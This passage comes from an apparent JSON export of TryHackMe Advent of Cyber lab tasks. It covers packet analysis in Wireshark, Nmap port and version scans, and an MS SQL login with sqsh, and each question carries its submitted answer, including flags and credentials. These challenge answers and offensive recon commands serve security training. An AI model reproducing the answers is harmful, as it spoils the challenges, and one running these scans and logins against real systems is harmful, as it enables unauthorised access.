Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">packet.tryhackme.com</span>  is <span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">127.0.0.1</span>. <u>Note that the PCAP file may have different IPs or extra packets that have not been discussed.</u> There are other DNS requests that have been generated in the PCAP file. Now, dig more into DNS queries and responses in Wireshark and answer question 4 in this task.</p><p><span style=\"font-weight:bolder\">FTP</span></p><p>The provided PCAP file has <span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">FTP</span> packets that have been received by our server. For this task,  we will be looking at <span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">FTP</span> traffic in Wireshark. Like other protocols, <span style=\"font-size:1rem\">we will be using Wireshark filters to look into FTP packets. By default, the FTP server is listening on TCP port 21. Therefore, we filter and list all FTP packets by using the following filter: </span><span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">ftp</span> <span style=\"font-size:1rem\">or </span><span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">tcp.port == 21</span><span style=\"font-size:1rem\"> </span></p><p>The following figure shows all FTP packets, and we can see all packet details by checking the field section. It is obvious that the sender is connected to the FTP server and the server responded with the FTP server header, <span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">vsFTPd 3.0.3</span>. Next, the user sent an FTP request with <span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">tryhackftp</span> as a user command which is the username of the FTP server.</p><p style=\"text-align:center\"><img src=\"https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/8257d43679e94329c3322922021796f9.png\" /></p><p>Keep checking the FTP packets in Wireshark and answer question 5 and 6 in this task. We can also show all FTP commands by choosing the first FTP packet and right-clicking on it. Then, select <span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">follow -&gt; TCP-Steam</span>.</p><p>The user logged into the FTP server using a username and password and uploaded a secret file. Thus, the current Wireshark filter will not show the packet of the actual uploaded file. Instead, we can use the <span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">ftp-data</span> Wireshark filter to list the packets that have the content of the file. Apply this filter and answer the final question in this task.</p>","taskType":"downloadable","taskNo":14,"taskCreated":"2021-11-16T13:42:15.515Z","taskDeadline":null,"tasksInfo":[{"question":"<div><div><span style=\"font-size:1rem\">In the <span style=\"font-weight:bolder\">HTTP #1 - GET</span> requests section, which directory is found on the web server?</span><br /></div><div style=\"text-align:center\"><img src=\"https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/531e2b23784c7217aaa8c70f7b1ffd72.png\" /></div></div>","hint":"Apply following filter: http.request.method == GET. Then Look for HTTP requests that have \"200 OK\" response.","questionNo":1,"correct":true,"extraPoints":0,"attempts":0,"submission":"login","noAnswer":false,"answerDesc":"Answer format: *****"},{"question":"<p><span style=\"font-size:1rem\">What is the username and password used in the login page in the <b>HTTP #2 - POST</b> section? </span></p>\n<p style=\"text-align:center\"><img src=\"https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/7f280bc3208a6c1acce1f98f6a0b38d4.png\" /><br /></p>","hint":"Apply following filter: http.request.method == POST. Then select the required packet, and finally expand the HTML form URL encoded section.","questionNo":2,"correct":true,"extraPoints":0,"attempts":0,"submission":"McSkidy:Christmas2021!","noAnswer":false,"answerDesc":"Answer format: *******:**************"},{"question":"<p>What is the User-Agent's name that has been sent in <b>HTTP #2 - POST </b>section?<br /></p>","hint":"Apply following filter: http.request.method == POST. Then select the required packet, and finally expand the Hypertext Transfer Protocol section. Find the User-Agent value.","questionNo":3,"correct":true,"extraPoints":0,"attempts":2,"submission":"TryHackMe-UserAgent-THM{d8ab1be969825f2c5c937aec23d55bc9}","noAnswer":false,"answerDesc":"Answer format: ***********************{********************************}"},{"question":"<p>In the DNS section, there is a TXT DNS query. What is the flag in the message of that DNS query?</p><p>\n</p><p style=\"text-align:center\"><img src=\"https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/f5d86ffbeeb4787bdd0e03d31888dc0b.png\" /><br /></p>","hint":"Apply the following filter: dns or udp.port==53.\nThen find the required response packet which has TXT record. Finally right click on it, Follow -> UDP Stream.","questionNo":4,"correct":true,"extraPoints":0,"attempts":0,"submission":"THM{dd63a80bf9fdd21aabbf70af7438c257}","noAnswer":false,"answerDesc":"Answer format: ***{********************************}"},{"question":"<p>In the FTP section, what is the FTP login password?</p>","hint":"Apply the following filter: ftp. Then, you need to find the FTP request that has FTP PASS command.","questionNo":5,"correct":true,"extraPoints":0,"attempts":0,"submission":"TryH@ckM3!","noAnswer":false,"answerDesc":"Answer format: **********"},{"question":"<p>In the FTP section, what is the FTP command used to upload the <span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">secret.txt</span>  file?</p>\n<p style=\"text-align:center\"><img src=\"https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/034ca6d2c8ac31403bf33a32e3c3ad35.png\" /><br /></p>","hint":"Apply the following filter: ftp-data.\nThen find the required packet. Then expand the Transmission Control Protocol section, and look at the command value.","questionNo":6,"correct":true,"extraPoints":0,"attempts":0,"submission":"STOR","noAnswer":false,"answerDesc":"Answer format: ****"},{"question":"<p><span style=\"font-size:1rem\">In the FTP section, what is the content of the secret.txt file?</span><br /></p>\n<p style=\"text-align:center\"><img src=\"https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/a059f0abb2667ee37b6fa713ed70f28a.png\" /><br /></p>","hint":"Apply the following filter: ftp-data.\nThen find the required packet. Finally Expand the Line-base text data section.\nOnly include the part after \"AoC Flag:\" as your answer.","questionNo":7,"correct":true,"extraPoints":0,"attempts":0,"submission":"123^-^321","noAnswer":false,"answerDesc":"Answer format: *********"}],"uploadId":"61895b65db10390041c316d4","questions":[{"questionNo":1,"question":"<div><div><span style=\"font-size:1rem\">In the <span style=\"font-weight:bolder\">HTTP #1 - GET</span> requests section, which directory is found on the web server?</span><br /></div><div style=\"text-align:center\"><img src=\"https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/531e2b23784c7217aaa8c70f7b1ffd72.png\" /></div></div>","hint":"Apply following filter: http.request.method == GET. Then Look for HTTP requests that have \"200 OK\" response."},{"questionNo":2,"question":"<p><span style=\"font-size:1rem\">What is the username and password used in the login page in the <b>HTTP #2 - POST</b> section? </span></p>\n<p style=\"text-align:center\"><img src=\"https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/7f280bc3208a6c1acce1f98f6a0b38d4.png\" /><br /></p>","hint":"Apply following filter: http.request.method == POST. Then select the required packet, and finally expand the HTML form URL encoded section."},{"questionNo":3,"question":"<p>What is the User-Agent's name that has been sent in <b>HTTP #2 - POST </b>section?<br /></p>","hint":"Apply following filter: http.request.method == POST. Then select the required packet, and finally expand the Hypertext Transfer Protocol section. Find the User-Agent value."},{"questionNo":4,"question":"<p>In the DNS section, there is a TXT DNS query. What is the flag in the message of that DNS query?</p><p>\n</p><p style=\"text-align:center\"><img src=\"https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/f5d86ffbeeb4787bdd0e03d31888dc0b.png\" /><br /></p>","hint":"Apply the following filter: dns or udp.port==53.\nThen find the required response packet which has TXT record. Finally right click on it, Follow -> UDP Stream."},{"questionNo":5,"question":"<p>In the FTP section, what is the FTP login password?</p>","hint":"Apply the following filter: ftp. Then, you need to find the FTP request that has FTP PASS command."},{"questionNo":6,"question":"<p>In the FTP section, what is the FTP command used to upload the <span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">secret.txt</span>  file?</p>\n<p style=\"text-align:center\"><img src=\"https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/034ca6d2c8ac31403bf33a32e3c3ad35.png\" /><br /></p>","hint":"Apply the following filter: ftp-data.\nThen find the required packet. Then expand the Transmission Control Protocol section, and look at the command value."},{"questionNo":7,"question":"<p><span style=\"font-size:1rem\">In the FTP section, what is the content of the secret.txt file?</span><br /></p>\n<p style=\"text-align:center\"><img src=\"https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/a059f0abb2667ee37b6fa713ed70f28a.png\" /><br /></p>","hint":"Apply the following filter: ftp-data.\nThen find the required packet. Finally Expand the Line-base text data section.\nOnly include the part after \"AoC Flag:\" as your answer."}]},{"taskTitle":"[Day 10] <span class=\"badge badge-soft-warning size-16\">Networking</span> Offensive Is The Best Defence","taskDesc":"<p>McSkidy is trying to discover how the attackers managed to penetrate the network and cause damage to the Best Festival Company’s infrastructure. She decided to start doing a security assessment of her systems to discover how Grinch Enterprises managed to cause this damage. She started by conducting a security assessment of her systems to discover how Grinch Enterprises managed to cause this damage and wonders what service they exploited.</p><p>Before McSkidy starts firing up Nmap, let’s review some keywords related to her task. If you are familiar with the terms IP address, protocol, server, and port number, feel free to skip the following three sections and start directly with the Nmap section.</p><h2><span style=\"font-size:24px\">Check out Philip Wylie's walkthrough video for day 10 </span><a href=\"https://www.youtube.com/watch?v=yHjD_07r5xs\" target=\"_blank\"><span style=\"font-size:24px\">here</span></a><br /><br /></h2><h3>IP Addresses</h3><p>Every computer (host) that connects to a network needs to have a logical address. For instance, a host can be any system with network access, such as a laptop, a smartphone, and a Raspberry Pi. We refer to this address as logical because it's assigned by software and could change over time, for example, when the host connects to a new network. The logical address, in this case, is the IP address.</p><p>IP stands for Internet Protocol. To keep things simple, we will consider Internet Protocol version 4 (IPv4). An IPv4 address is made up of 4 decimal numbers. The range for each number is from 0 to 255. Example IPv4 addresses are:</p><ul><li><code style=\"font-size:14px\">192.168.0.10</code></li><li><code style=\"font-size:14px\">172.16.0.100</code></li><li><code style=\"font-size:14px\">10.10.11.12</code></li><li><code style=\"font-size:14px\">1.1.1.1</code></li></ul><p>The first 3 IP addresses in the list above are private, meaning that they can only be accessed from the private network they belong to. The last IP address, <code style=\"font-size:14px\">1.1.1.1</code>, is a public IP address that can be accessed by the whole Internet and belongs to Cloudflare.</p><p>Some IP addresses serve a special purpose. For example, <code style=\"font-size:14px\">127.0.0.1</code> is often referred to as the 'loopback address' or 'localhost'. By default, any packet or traffic destined to this address won't leave the host.</p><p>On Microsoft Windows, one way to find your IP address is by running <code style=\"font-size:14px\">ipconfig</code> in the command prompt or PowerShell. On Linux and macOS, you can find your IP address by executing <code style=\"font-size:14px\">ip address show</code> on the terminal. Note that <code style=\"font-size:14px\">ip</code> will accept abbreviations of arguments such as <code style=\"font-size:14px\">ip addr show</code> or even <code style=\"font-size:14px\">ip a s</code>.</p><div class=\"terminal-container\"><div class=\"terminal-content\"><div class=\"terminal-top\">Terminal</div><pre class=\"terminal-code\" style=\"font-size:14px\">           <code class=\"language-shell-session\">user@TryHackMe$ ip addr show\n1: lo: mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000\n    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n    inet 127.0.0.1/8 scope host lo\n       valid_lft forever preferred_lft forever\n    inet6 ::1/128 scope host\n       valid_lft forever preferred_lft forever\n2: wlp1s0: mtu 1500 qdisc noqueue state UP group default qlen 1000\n    link/ether 80:30:49:c8:28:b3 brd ff:ff:ff:ff:ff:ff\n    inet 192.168.0.202/24 brd 192.168.0.255 scope global dynamic noprefixroute wlp1s0\n       valid_lft 84435sec preferred_lft 84435sec\n    inet6 fe80::c3:6a8f:ff22:cff/64 scope link noprefixroute\n       valid_lft forever preferred_lft forever</code>\n        </pre></div></div><p>The terminal output above shows that this Linux system has a wireless adaptor with the IP address <code style=\"font-size:14px\">192.168.0.202</code>.</p><p>If you want to learn more about computer networking, we recommend the <a href=\"https://tryhackme.com/module/network-fundamentals\">Network Fundamentals</a> module.</p><h3>Protocols and Servers</h3><p>Let’s say that we want to set up a website and we've made it accessible to the whole Internet. In order to make our website accessible to the users on the Internet, a public IP address is required. A web server is a program that listens for incoming connections, usually from web browsers, and responds to their requests.</p><p>A server usually refers to a computer system that provides services to other clients, i.e. other computers, over a network. Example services include serving webpages, delivering email, and facilitating video conferencing.</p><p>For the client computer to communicate with the server, a specific protocol must be followed. Consider the following analogy. You want to order an espresso from a coffee shop for takeaway. The protocol to get an espresso might go as follow:</p><ul><li>Customer: Hello</li><li>Barista: Hello</li><li>Customer: I want one espresso, please</li><li>Barista: That would be £3</li><li>Customer: Here you are, £3</li><li>Barista: Thank you. Your espresso is ready.</li><li>Customer: Thank you.</li></ul><p align=\"center\"><img src=\"https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/e5014eb22c29f15cee0bdf95cf11ab24.png\" style=\"width:807px\" /></p><p>Since I follow this “protocol”, other customers might follow a slightly different “protocol” based on the coffee shop and the country’s culture. Some might skip the “hello” at the beginning or drop the “thank you” at the end. In the human world, this would still work; however, for computers, we need to adopt a strict protocol that both clients and servers need to adhere to. This is why we have standard protocols for computers.</p><p>To name a few, these are some example TCP/IP protocols:</p><ul><li>Hypertext Transfer Protocol (HTTP) for serving webpages</li><li>Domain Name System (DNS) for resolving hostnames to IP addresses</li><li>Post Office Protocol version 3 (POP3) for delivering email</li><li>Simple Mail Transfer Protocol (SMTP) for sending email</li><li>Telnet for remote login</li><li>Secure Shell (SSH) for secure remote login</li></ul><p>Each of these protocols are defined in detail in a Request for Comment (RFC) document. If you want to know more about these protocols, we suggest joining the <a href=\"https://tryhackme.com/jr/protocolsandservers\">Protocols and Servers</a> room.</p><h3>Ports</h3><p>On a host, multiple processes (programs) can be accessing the network at the same time. These processes can use the network simultaneously. For the host to tell which process receives which packet, we need to use port numbers. To better understand the concept of IP addresses and port numbers, let’s consider the following analogy.</p><p>Let’s imagine TryHackMe’s company in London, and let’s imagine there are 100 offices for 100 content engineers there. The company address is like a public IP address. With the company address, the mailman (analogy for a router) knows how to reach the company and deliver mail packages. The port number is like the office number within the company. The mailman can deliver to the company address and hand it to the receptionist; however, a TryHackMe employee will deliver the package to the internal office.</p><p>When multiple processes are using the network or Internet simultaneously, each process can be recognized by the port number it is using. In public servers, default port numbers are used by different protocols so that clients don’t need to guess. The table below shows some of the common protocols and the port numbers they use by default.</p><table class=\"table table-bordered\" style=\"width:1076px\"><thead><tr><th>Protocol</th><th>Port Number</th></tr></thead><tbody><tr><td>HTTP</td><td>80</td></tr><tr><td>HTTPS</td><td>443</td></tr><tr><td>POP3</td><td>110</td></tr><tr><td>SMTP</td><td>25</td></tr><tr><td>SSH</td><td>22</td></tr><tr><td>Telnet</td><td>23</td></tr></tbody></table><p>Consider the figure below. IP packets coming to the server with the IP address <code style=\"font-size:14px\">10.10.13.13</code> will be delivered to the running process based on the destination port number.</p><ul><li>For packets of type TCP with port number 22, the destination process is the SSH server.</li><li>For packets of type TCP with port number 80, the destination process is the HTTP server.</li><li>For packets of type UDP (or TCP) with port number 53, the destination process is the DNS server.</li></ul><p align=\"center\"><img src=\"https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/73db4f49a9ddab7c19d101fc9400417f.png\" style=\"width:807px\" /><br /></p><p>We will not cover TCP and UDP in detail in this task. All you need to know for now is that these two protocols live on top of the IP protocol and <i>connect processes running on different hosts</i>. Moreover, TCP requires a three-way handshake for a connection to be established, while UDP does not.</p><h3>Nmap</h3><p>McSkidy wants to discover what the attacker learned about her hosts and servers. She starts the AttackBox and starts the attached Virtual Machine (VM), and waits for both to fully load.</p><p>She wants to check which services she has installed on the VM. On the AttackBox, she opens a terminal and rushes to run an Nmap scan against the VM. McSkidy can run a very basic network port scan using the command <code style=\"font-size:14px\">nmap -sT MACHINE_IP</code> or <code style=\"font-size:14px\">nmap -sS MACHINE_IP</code>. By default, Nmap checks the 1000 most common TCP ports.</p><ul><li>TCP Connect Scan: To run this type of scan, the <code style=\"font-size:14px\">-sT</code> option is required. Nmap will attempt to complete the three-way handshake in order to establish a connection with each port scanned.</li><li>TCP SYN Scan: You can select this scan with the <code style=\"font-size:14px\">-sS</code> option, and Nmap will not make a complete connection if the port is open. Technically speaking, Nmap does not complete a TCP three-way handshake.</li></ul><p>To better understand the difference between <code style=\"font-size:14px\">-sT</code> and <code style=\"font-size:14px\">-sS</code>, we can use the analogy of knocking on a door. The TCP connect scan (<code style=\"font-size:14px\">-sT</code>) is like knocking on a door, waiting for someone to open it, greeting each other, then excusing yourself to leave. The TCP SYN scan (<code style=\"font-size:14px\">-sS</code>) resembles knocking, and once someone answers, you pretend that it was not you that knocked and walk away innocently. The latter will make it more difficult for the other party to remember you.</p>","taskType":"vm","taskNo":15,"taskCreated":"2021-11-16T13:42:16.975Z","taskDeadline":null,"tasksInfo":[{"question":"Help McSkidy and run <code style=\"font-size:14px\">nmap -sT MACHINE_IP</code>. How many ports are open between 1 and 100?","hint":"","questionNo":1,"correct":true,"extraPoints":0,"attempts":2,"submission":"2","noAnswer":false,"answerDesc":"Answer format: *"},{"question":"<p>What is the smallest port number that is open?<br /></p>","hint":"","questionNo":2,"correct":true,"extraPoints":0,"attempts":0,"submission":"22","noAnswer":false,"answerDesc":"Answer format: **"},{"question":"<p>What is the service related to the highest port number you found in the first question?<br /></p>","hint":"","questionNo":3,"correct":true,"extraPoints":0,"attempts":0,"submission":"HTTP","noAnswer":false,"answerDesc":"Answer format: ****"},{"question":"<p><span style=\"font-size:1rem\">Now run </span><code style=\"font-size:14px\">nmap -sS MACHINE_IP</code><span style=\"font-size:1rem\">. Did you get the same results? (Y/N)</span><br /></p>","hint":"","questionNo":4,"correct":true,"extraPoints":0,"attempts":0,"submission":"Y","noAnswer":false,"answerDesc":"Answer format: *"},{"question":"<p>If you want Nmap to detect the version info of the services installed, you can use <code style=\"font-size:14px\">nmap -sV MACHINE_IP</code>. What is the version number of the web server?<br /></p>","hint":"","questionNo":5,"correct":true,"extraPoints":0,"attempts":0,"submission":"Apache httpd 2.4.49","noAnswer":false,"answerDesc":"Answer format: ****** ***** *.*.**"},{"question":"<p>By checking the <a href=\"https://httpd.apache.org/security/vulnerabilities_24.html\">vulnerabilities related to the installed web server</a>, you learn that there is a critical vulnerability that allows path traversal and remote code execution. Now you can tell McSkidy that Grinch Enterprises used this vulnerability. What is the CVE number of the vulnerability that was solved in version 2.4.51?<br /></p>","hint":"2.4.50 provided an incomplete fix for CVE-2021-41773.","questionNo":6,"correct":true,"extraPoints":0,"attempts":0,"submission":"CVE-2021-42013","noAnswer":false,"answerDesc":"Answer format: **************"},{"question":"<p><span style=\"font-size:1rem\">You are putting the pieces together and have a good idea of how your web server was exploited. McSkidy is suspicious that the attacker might have installed a backdoor. She asks you to check if there is some service listening on an uncommon port, i.e. outside the 1000 common ports that Nmap scans by default. She explains that adding </span><code style=\"font-size:14px\">-p1-65535</code><span style=\"font-size:1rem\"> or </span><code style=\"font-size:14px\">-p-</code><span style=\"font-size:1rem\"> will scan all 65,535 TCP ports instead of only scanning the 1000 most common ports. What is the port number that appeared in the results now?</span><br /></p>","hint":"If the scan takes more than a few minutes, consider using Nmap with the options -sT -p20000-21000 -T4 (where -p20000-21000 limits the scan to ports between 20,000 and 21,000, while T4 makes Nmap aggressive and increases the speed)","questionNo":7,"correct":true,"extraPoints":0,"attempts":0,"submission":"20212","noAnswer":false,"answerDesc":"Answer format: *****"},{"question":"<p>What is the name of the program listening on the newly discovered port?<br /></p>","hint":"Using Nmap with the option -sV should reveal the name under VERSION for the specified port(s). You may add something like -p20000-21000 to limit the range of ports you want to check.","questionNo":8,"correct":true,"extraPoints":0,"attempts":0,"submission":"telnetd","noAnswer":false,"answerDesc":"Answer format: *******"},{"question":"<p><span style=\"font-size:1rem\">If you would like to learn more about the topics covered in today’s tasks, we recommend checking out the </span><a href=\"https://tryhackme.com/module/network-security\">Network Security</a><span style=\"font-size:1rem\"> module.</span><br /></p>","hint":"","questionNo":9,"correct":true,"extraPoints":0,"attempts":0,"submission":"","noAnswer":true,"answerDesc":"No answer needed"}],"uploadId":"6183c08d5945730049be2bf1","questions":[{"questionNo":1,"question":"Help McSkidy and run <code style=\"font-size:14px\">nmap -sT MACHINE_IP</code>. How many ports are open between 1 and 100?","hint":""},{"questionNo":2,"question":"<p>What is the smallest port number that is open?<br /></p>","hint":""},{"questionNo":3,"question":"<p>What is the service related to the highest port number you found in the first question?<br /></p>","hint":""},{"questionNo":4,"question":"<p><span style=\"font-size:1rem\">Now run </span><code style=\"font-size:14px\">nmap -sS MACHINE_IP</code><span style=\"font-size:1rem\">. Did you get the same results? (Y/N)</span><br /></p>","hint":""},{"questionNo":5,"question":"<p>If you want Nmap to detect the version info of the services installed, you can use <code style=\"font-size:14px\">nmap -sV MACHINE_IP</code>. What is the version number of the web server?<br /></p>","hint":""},{"questionNo":6,"question":"<p>By checking the <a href=\"https://httpd.apache.org/security/vulnerabilities_24.html\">vulnerabilities related to the installed web server</a>, you learn that there is a critical vulnerability that allows path traversal and remote code execution. Now you can tell McSkidy that Grinch Enterprises used this vulnerability. What is the CVE number of the vulnerability that was solved in version 2.4.51?<br /></p>","hint":"2.4.50 provided an incomplete fix for CVE-2021-41773."},{"questionNo":7,"question":"<p><span style=\"font-size:1rem\">You are putting the pieces together and have a good idea of how your web server was exploited. McSkidy is suspicious that the attacker might have installed a backdoor. She asks you to check if there is some service listening on an uncommon port, i.e. outside the 1000 common ports that Nmap scans by default. She explains that adding </span><code style=\"font-size:14px\">-p1-65535</code><span style=\"font-size:1rem\"> or </span><code style=\"font-size:14px\">-p-</code><span style=\"font-size:1rem\"> will scan all 65,535 TCP ports instead of only scanning the 1000 most common ports. What is the port number that appeared in the results now?</span><br /></p>","hint":"If the scan takes more than a few minutes, consider using Nmap with the options -sT -p20000-21000 -T4 (where -p20000-21000 limits the scan to ports between 20,000 and 21,000, while T4 makes Nmap aggressive and increases the speed)"},{"questionNo":8,"question":"<p>What is the name of the program listening on the newly discovered port?<br /></p>","hint":"Using Nmap with the option -sV should reveal the name under VERSION for the specified port(s). You may add something like -p20000-21000 to limit the range of ports you want to check."},{"questionNo":9,"question":"<p><span style=\"font-size:1rem\">If you would like to learn more about the topics covered in today’s tasks, we recommend checking out the </span><a href=\"https://tryhackme.com/module/network-security\">Network Security</a><span style=\"font-size:1rem\"> module.</span><br /></p>","hint":""}]},{"taskTitle":"[Day 11] <span class=\"badge badge-soft-warning size-16\">Networking</span> Where Are The Reindeers?","taskDesc":"<h2><span style=\"font-size:24px\">Check out Tib3rius' walkthrough video for day 11 </span><a href=\"https://www.youtube.com/watch?v=VJ2YFzTMqNY\" target=\"_blank\"><span style=\"font-size:24px\">here</span></a><br /><br /></h2><p>Before we begin, we suggest that you start the attached Machine and the AttackBox as you will need to use these resources to answer the questions at the end.</p><p>McDatabaseAdmin came rushing into the room and cried to McSkidy, “We’ve been locked out of the reindeer schedule - how will Santa’s transportation work for Christmas?” The grinch has locked McDatabaseAdmin of his system. You need to probe the external surface of the server to see if you get him his access back.</p><p>MS SQL Server is a Relational Database Management System (RDBMS). One simple way to think of a relational database is a group of tables that have relations. To gain a rough understanding of relational databases work, consider a shop's database with the following three tables:</p><ol><li>Electronic Items</li><li>Customers</li><li>Invoices</li></ol><p>Each item in the Electronic Items table has:</p><ul><li>ID</li><li>Name</li><li>Price</li><li>Quantity</li></ul><p>Each item in the Customers table has its own attributes as well:</p><ul><li>ID</li><li>Name</li><li>Email</li><li>Phone</li></ul><p>Finally, the Invoices table will refer to a customer and one or more electronic items. The Invoice table will refer to an “entity” from another table using its ID. This way, we only need to have the customer details and electronic item details written once instead of copying them to each new invoice. This case is a simplified example of a relational database. The figure below shows how the three tables are related.</p><p align=\"center\"><img src=\"https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/98f9219ab5ae7ef9ef2e9e07a992ca3e.png\" style=\"width:807px\" /></p><p>The transportation schedule is in the reindeer database. However, McDatabaseAdmin can no longer log in to his system after the grinch changed the system password. Let’s see how we can help. Make sure you have started the attached Machine along with the AttackBox. Give them a few minutes to fully start before proceeding to answer the following questions.</p><p align=\"center\"><br /></p><p align=\"center\"><img src=\"https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/20b551ee6ff7b4767153989c16f2d3fc.png\" style=\"width:807px\" /></p>","taskType":"vm","taskNo":16,"taskCreated":"2021-11-16T13:42:19.486Z","taskDeadline":null,"tasksInfo":[{"question":"<p>You decided that the first step would be to check the running services on <code style=\"font-size:14px\">MACHINE_IP</code>. You resort to yesterday’s tool, Nmap.</p><p>Knowing that <code style=\"font-size:14px\">MACHINE_IP</code> is a MS Windows system, you expect it to not respond to ping probes by default; therefore, you need to add <code style=\"font-size:14px\">-Pn</code> to your <code style=\"font-size:14px\">nmap</code> command to perform the scan. This instructs Nmap to skip pinging the target to see if the host is reachable. Without this option, Nmap will assume the target host is offline and not proceed with scanning.</p><p>There is an open port related to MS SQL Server accessible over the network. What is the port number?</p>","hint":"","questionNo":1,"correct":true,"extraPoints":0,"attempts":1,"submission":"1433","noAnswer":false,"answerDesc":"Answer format: ****"},{"question":"<p>Knowing the MS SQL Server is running and accessible over the network, we want to check if our username and password are still valid. Using the AttackBox terminal, we will use the command <code style=\"font-size:14px\">sqsh</code> (pronounced skwish), an interactive database shell.</p><p>A simple syntax would be <code style=\"font-size:14px\">sqsh -S server -U username -P password</code>, where:</p><ul><li><code style=\"font-size:14px\">-S server</code> is used to specify the server, for example <code style=\"font-size:14px\">-S MACHINE_IP</code></li><li><code style=\"font-size:14px\">-U username</code> is used to provide the username; for example, <code style=\"font-size:14px\">-U sa</code> is the username that we have enabled.</li><li><code style=\"font-size:14px\">-P password</code> lets us specify the password.</li></ul><p>Let’s try to run, <code style=\"font-size:14px\">sqsh -S MACHINE_IP -U sa -P t7uLKzddQzVjVFJp</code></p><p>If the connection is successful, you will get a prompt. What is the prompt that you have received?</p>","hint":"","questionNo":2,"correct":true,"extraPoints":0,"attempts":3,"submission":"1>","noAnswer":false,"answerDesc":"Answer format: **"},{"question":"<p>McDatabaseAdmin told us the database name is <code style=\"font-size:14px\">reindeer</code> and it has three tables:</p><p></p><ol><li><code style=\"font-size:14px\">names</code></li><li><code style=\"font-size:14px\">presents</code></li><li><code style=\"font-size:14px\">schedule</code></li></ol><p>To display the table <code style=\"font-size:14px\">names</code>, you could use the following syntax, <code style=\"font-size:14px\">SELECT * FROM table_name WHERE condition</code>.</p><ul><li><code style=\"font-size:14px\">SELECT *</code> is used to return specific columns (attributes). <code style=\"font-size:14px\">*</code> refers to all the columns.</li><li><code style=\"font-size:14px\">FROM table_name</code> to specify the table you want to read from.</li><li><code style=\"font-size:14px\">WHERE condition</code> to specify the rows (entities).</li></ul><p>In the terminal below, we executed the query, <code style=\"font-size:14px\">SELECT * FROM reindeer.dbo.names;</code>. This SQL query should dump all the contents of the table <code style=\"font-size:14px\">names</code> from the database <code style=\"font-size:14px\">reindeer</code>. Note that the 